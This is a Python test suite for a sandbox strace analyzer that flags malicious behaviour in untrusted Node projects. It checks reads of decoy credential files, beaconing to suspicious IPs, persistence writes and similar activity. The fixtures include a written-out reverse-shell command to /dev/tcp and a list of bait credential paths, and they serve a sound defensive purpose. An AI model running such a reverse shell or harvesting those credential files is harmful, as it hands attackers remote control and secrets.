import json

import analyze

FH = "/home/alex"
DECOYS = [".ssh/id_ed25519", ".aws/credentials", ".npmrc", ".gitconfig", ".config/google-chrome/Default/Login Data"]
PRELUDE = [
    '100 execve("/usr/bin/bwrap", ["bwrap", "--ro-bind", "/usr", "/usr"], 0x7ffd /* 90 vars */) = 0',
    "100 clone(child_stack=NULL, flags=CLONE_NEWNS|CLONE_NEWPID|SIGCHLD) = 101",
    '101 openat(AT_FDCWD</>, "/home/alex/.ssh/id_ed25519", O_RDONLY) = 3</home/alex/.ssh/id_ed25519>',
    "101 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x1) = 2 /* 102 in strace's PID NS */",
    '102 execve("/usr/bin/timeout", ["timeout", "-k", "5", "60", "bash", "--noprofile", "--norc", "-c", "node x.js"], 0x1 /* 12 vars */) = 0',
    "102 clone(child_stack=NULL, flags=SIGCHLD) = 3 /* 103 in strace's PID NS */",
    '103 execve("/usr/bin/bash", ["bash", "--noprofile", "--norc", "-c", "node x.js"], 0x1 /* 12 vars */) = 0',
    '103 execve("/opt/node/bin/node", ["node", "x.js"], 0x1 /* 12 vars */) = 0',
]


def make_box(tmp_path, lines, mode="nonet", homediff=""):
    box = tmp_path / "box"
    logs = box / "logs"
    logs.mkdir(parents=True)
    (box / "meta.json").write_text(json.dumps({"fake_home": FH}))
    (box / "decoys.txt").write_text("\n".join(DECOYS) + "\n")
    tag = f"20260101-000000-{mode}-1"
    (logs / f"{tag}.trace").write_text("\n".join(PRELUDE + lines) + "\n")
    (logs / f"{tag}.status").write_text("0\n")
    (logs / f"{tag}.cmd").write_text("node x.js\n")
    (logs / f"{tag}.homediff").write_text(homediff)
    return box


def findings(box):
    r = analyze.analyze(box)
    return r, [f for run in r["runs"] for f in run["findings"]]


def whats(fs, severity=None):
    return [f["what"] for f in fs if severity is None or f["severity"] == severity]


def test_bwrap_setup_is_ignored_and_clean_run(tmp_path):
    r, fs = findings(make_box(tmp_path, ['103 openat(AT_FDCWD</work>, "index.js", O_RDONLY|O_CLOEXEC) = 20</work/index.js>']))
    assert r["verdict"] == "nothing-seen" and fs == []
    assert r["runs"][0]["sandbox_started"]


def test_sandbox_not_started_is_error(tmp_path):
    box = make_box(tmp_path, [])
    t = next((box / "logs").glob("*.trace"))
    t.write_text(PRELUDE[0] + "\n")
    r = analyze.analyze(box)
    assert r["verdict"] == "error" and r["runs"][0]["error"]


def test_bait_read_through_symlink(tmp_path):
    lines = ['103 openat(AT_FDCWD</work>, "innocent.txt", O_RDONLY|O_CLOEXEC) = 21</home/alex/.aws/credentials>']
    r, fs = findings(make_box(tmp_path, lines))
    assert r["verdict"] == "malicious-behaviour"
    assert any("~/.aws/credentials" in w for w in whats(fs, "high"))


def test_npm_reading_npmrc_is_expected(tmp_path):
    lines = [
        '103 execve("/opt/node/bin/npm", ["npm", "run", "build"], 0x1 /* 1 vars */) = 0',
        '103 openat(AT_FDCWD</work>, "/home/alex/.npmrc", O_RDONLY|O_CLOEXEC) = 22</home/alex/.npmrc>',
    ]
    _, fs = findings(make_box(tmp_path, lines))
    assert not any("npmrc" in w for w in whats(fs))


def test_node_reading_npmrc_is_flagged(tmp_path):
    lines = ['103 openat(AT_FDCWD</work>, "/home/alex/.npmrc", O_RDONLY|O_CLOEXEC) = 22</home/alex/.npmrc>']
    _, fs = findings(make_box(tmp_path, lines))
    assert any("~/.npmrc" in w for w in whats(fs, "high"))


def test_failed_bait_open_is_not_a_read(tmp_path):
    lines = ['103 openat(AT_FDCWD</work>, "/home/alex/.ssh/id_ed25519", O_RDONLY) = -1 EACCES (Permission denied)']
    _, fs = findings(make_box(tmp_path, lines))
    assert not any("bait" in w for w in whats(fs))


def test_unfinished_resumed_connect(tmp_path):
    lines = [
        '103 connect(21<socket:[1]>, {sa_family=AF_INET, sin_port=htons(1224), sin_addr=inet_addr("216.126.231.70")}, 16 <unfinished ...>',
        "104 getpid() = 5",
        "103 <... connect resumed>) = -1 ENETUNREACH (Network is unreachable)",
    ]
    r, fs = findings(make_box(tmp_path, lines))
    hit = [f for f in fs if "216.126.231.70:1224" in f["what"]]
    assert hit and hit[0]["severity"] == "high" and "ENETUNREACH" in hit[0]["detail"]


def test_ipv4_mapped_ipv6_and_private_and_port_zero(tmp_path):
    lines = [
        '103 connect(21<socket:[1]>, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "::ffff:153.75.88.215", &sin6_addr), sin6_scope_id=0}, 28) = -1 ENETUNREACH (Network is unreachable)',
        '103 connect(22<socket:[2]>, {sa_family=AF_INET, sin_port=htons(22), sin_addr=inet_addr("192.168.1.10")}, 16) = -1 ENETUNREACH (Network is unreachable)',
        '103 connect(23<socket:[3]>, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("8.8.8.8")}, 16) = -1 ENETUNREACH (Network is unreachable)',
    ]
    _, fs = findings(make_box(tmp_path, lines))
    w = whats(fs)
    assert any("153.75.88.215:443" in x for x in whats(fs, "high"))
    assert any("192.168.1.10:22" in x for x in whats(fs, "medium"))
    assert not any("8.8.8.8" in x for x in w)


def test_net_mode_registry_is_info(tmp_path):
    lines = ['103 connect(21<socket:[1]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("104.16.3.34")}, 16) = -1 EINPROGRESS (Operation now in progress)']
    r, fs = findings(make_box(tmp_path, lines, mode="net"))
    assert r["verdict"] == "nothing-seen" and any("npm registry" in w for w in whats(fs, "info"))


def dns_line(pid, labels):
    qname = "".join(f"\\{len(x):03o}{x}" for x in labels.split("."))
    payload = r"\20k\1\0\0\1\0\0\0\0\0\0" + qname + r"\0\0\1\0\1"
    return f'{pid} sendmmsg(20<socket:[9]>, [{{msg_hdr={{msg_name=NULL, msg_iov=[{{iov_base="{payload}", iov_len=39}}]}}}}], 1, MSG_NOSIGNAL) = 1'


def test_dns_query_decoding(tmp_path):
    _, fs = findings(make_box(tmp_path / "a", [dns_line(103, "evil-test.example.com")]))
    assert any("evil-test.example.com" in w for w in whats(fs, "info"))
    loader = [
        "103 clone(child_stack=NULL, flags=SIGCHLD) = 9 /* 130 in strace's PID NS */",
        '130 execve("/opt/node/bin/node", ["node", "-e", "const u=require(\'url\');import(u.pathToFileURL(f).href)", "/work/tailwind.config.js"], 0x1 /* 3 vars */) = 0',
        dns_line(130, "evil-test.example.com"),
    ]
    _, fs = findings(make_box(tmp_path / "b", loader))
    hit = [f for f in fs if "evil-test.example.com" in f["what"]]
    assert hit and hit[0]["severity"] == "medium" and hit[0]["phase"] == "config load"
    _, fs = findings(make_box(tmp_path / "c", [dns_line(103, "abc.trycloudflare.com")]))
    assert any("trycloudflare" in w for w in whats(fs, "high"))
    lines = ['103 sendto(20<socket:[9]>, "\\20k\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0\\10registry\\5npmjs\\3org\\0\\0\\1\\0\\1", 35, 0, NULL, 0) = 35']
    _, fs = findings(make_box(tmp_path / "d", lines))
    assert any("registry.npmjs.org" in w for w in whats(fs, "info"))


def test_dns_decoder_rejects_garbage():
    assert analyze.dns_query_name(b"hello world this is not dns") is None
    assert analyze.dns_query_name(b"\x00" * 40) is None


def test_persistence_and_system_writes(tmp_path):
    lines = [
        '103 openat(AT_FDCWD</work>, "/home/alex/.config/systemd/user/x.service", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 23</home/alex/.config/systemd/user/x.service>',
        '103 openat(AT_FDCWD</work>, "/etc/cron.d/x", O_WRONLY|O_CREAT, 0644) = -1 EROFS (Read-only file system)',
        '103 openat(AT_FDCWD</work>, "/home/alex/.cache/next/x", O_WRONLY|O_CREAT, 0644) = 24</home/alex/.cache/next/x>',
        '103 openat(AT_FDCWD</work>, "/home/alex/.config/nextjs-nodejs/config.json", O_WRONLY|O_CREAT, 0644) = 25</home/alex/.config/nextjs-nodejs/config.json>',
        '103 openat(AT_FDCWD</work>, "/home/alex/notes.txt", O_WRONLY|O_CREAT, 0644) = 26</home/alex/notes.txt>',
        '103 openat(AT_FDCWD</work>, "dist/out.js", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 27</work/dist/out.js>',
    ]
    _, fs = findings(make_box(tmp_path, lines))
    high = whats(fs, "high")
    assert any("systemd/user/x.service" in w for w in high)
    assert any("/etc/cron.d/x" in w for w in high)
    assert any("notes.txt" in w for w in whats(fs, "medium"))
    assert not any(".cache/next" in w or "nextjs-nodejs" in w and "medium" in w for w in high)
    assert not any("dist/out.js" in w for w in whats(fs))


def test_relative_paths_use_dirfd(tmp_path):
    lines = ['103 openat(3</home/alex>, ".bashrc", O_WRONLY|O_APPEND) = 4</home/alex/.bashrc>']
    _, fs = findings(make_box(tmp_path, lines))
    assert any(".bashrc" in w for w in whats(fs, "high"))


def test_secrets_folder_listing_and_escaped_quotes(tmp_path):
    lines = [
        '103 openat(AT_FDCWD</work>, "/home/alex/.ssh", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 20</home/alex/.ssh>',
        '103 openat(AT_FDCWD</work>, "we\\"ird\\303\\251.js", O_RDONLY) = 21</work/we"ird\\303\\251.js>',
    ]
    _, fs = findings(make_box(tmp_path, lines))
    assert any("listed a secrets folder: ~/.ssh" in w for w in whats(fs, "high"))


def test_programs(tmp_path):
    lines = [
        "103 clone(child_stack=NULL, flags=SIGCHLD) = 9 /* 109 in strace's PID NS */",
        '109 execve("/usr/bin/curl", ["curl", "-s", "http://x"], 0x1 /* 3 vars */) = 0',
        "103 clone(child_stack=NULL, flags=SIGCHLD) = 10 /* 110 in strace's PID NS */",
        '110 execve("/tmp/.x/payload", ["payload"], 0x1 /* 3 vars */) = 0',
        "103 clone(child_stack=NULL, flags=SIGCHLD) = 11 /* 111 in strace's PID NS */",
        '111 execve("/bin/sh", ["sh", "-c", "bash -i >& /dev/tcp/1.2.3.4/80 0>&1"], 0x1 /* 3 vars */) = 0',
        "103 clone(child_stack=NULL, flags=SIGCHLD) = 12 /* 112 in strace's PID NS */",
        '112 execve("/usr/bin/sudo", ["sudo", "-n", "true"], 0x1 /* 3 vars */) = -1 EPERM (Operation not permitted)',
    ]
    r, fs = findings(make_box(tmp_path, lines))
    high = whats(fs, "high")
    assert "started curl" in high
    assert any("temp folder" in w for w in high)
    assert any("raw network connection" in w for w in high)
    assert "started sudo" not in high
    assert r["runs"][0]["programs"]["curl"] == 1


def test_unknown_pid_inherits_from_last_cloner(tmp_path):
    lines = [
        "103 clone3({flags=CLONE_VM|CLONE_THREAD, child_tid=0x1}, 88 <unfinished ...>",
        '120 connect(5<socket:[1]>, {sa_family=AF_INET, sin_port=htons(1224), sin_addr=inet_addr("216.126.231.70")}, 16) = -1 ENETUNREACH (Network is unreachable)',
    ]
    _, fs = findings(make_box(tmp_path, lines))
    f = next(x for x in fs if "216.126.231.70" in x["what"])
    assert f["process"].startswith("node")


def test_unix_sockets(tmp_path):
    lines = [
        '103 connect(5<socket:[1]>, {sa_family=AF_UNIX, sun_path="/var/run/docker.sock"}, 110) = -1 ENOENT (No such file or directory)',
        '103 connect(6<socket:[2]>, {sa_family=AF_UNIX, sun_path=@"/tmp/.X11-unix/X0"}, 20) = -1 ECONNREFUSED (Connection refused)',
        '103 connect(7<socket:[3]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)',
    ]
    _, fs = findings(make_box(tmp_path, lines))
    assert any("docker.sock" in w for w in whats(fs, "high"))
    assert any("X11" in w for w in whats(fs, "medium"))
    assert not any("nscd" in w for w in whats(fs))


def test_symlink_chmod_and_bait_unlink(tmp_path):
    lines = [
        '103 symlinkat("/home/alex/.ssh/id_ed25519", AT_FDCWD</work>, "key.txt") = 0',
        '103 chmod("/home/alex/.local/bin/x", 0755) = 0',
        '103 unlinkat(AT_FDCWD</work>, "/home/alex/.aws/credentials", 0) = 0',
        '103 fchmodat(AT_FDCWD</work>, "node_modules/.bin/x", 0755) = 0',
    ]
    _, fs = findings(make_box(tmp_path, lines))
    assert any("made a link to /home/alex/.ssh/id_ed25519 at /work/key.txt" in w for w in whats(fs, "medium"))
    assert any(".local/bin/x" in w for w in whats(fs, "high"))
    assert any("~/.aws/credentials" in w for w in whats(fs, "high"))
    assert not any("node_modules/.bin" in w for w in whats(fs))


def test_home_diff(tmp_path):
    diff = (
        "3c3\n< aaa  ./.bashrc\n---\n> bbb  ./.bashrc\n"
        "> ccc  ./.config/autostart/x.desktop\n"
        "< ddd  ./.ssh/id_ed25519\n"
        "> eee  ./random.txt\n"
        "> symlink  ./link -> /etc/passwd\n"
    )
    _, fs = findings(make_box(tmp_path, [], homediff=diff))
    high = whats(fs, "high")
    assert any("~/.ssh/id_ed25519" in w and "removed" in w for w in high)
    assert any(".bashrc" in w and "changed" in w for w in high)
    assert any("autostart" in w for w in high)
    assert any("random.txt" in w for w in whats(fs, "medium"))


def test_c_unescape():
    assert analyze.c_unescape(r"a\"b\\c\n\x41\101\0") == b'a"b\\c\nAA\x00'
    assert analyze.c_unescape("tail\\") == b"tail\\"


def test_render_and_cli(tmp_path, capsys):
    box = make_box(tmp_path, ['103 connect(21<socket:[1]>, {sa_family=AF_INET, sin_port=htons(1224), sin_addr=inet_addr("216.126.231.70")}, 16) = -1 ENETUNREACH (Network is unreachable)'])
    assert analyze.main([str(box)]) == 2
    out = capsys.readouterr().out
    assert "HIGH" in out and "216.126.231.70:1224" in out
    assert analyze.main([str(tmp_path / "empty")]) == 3
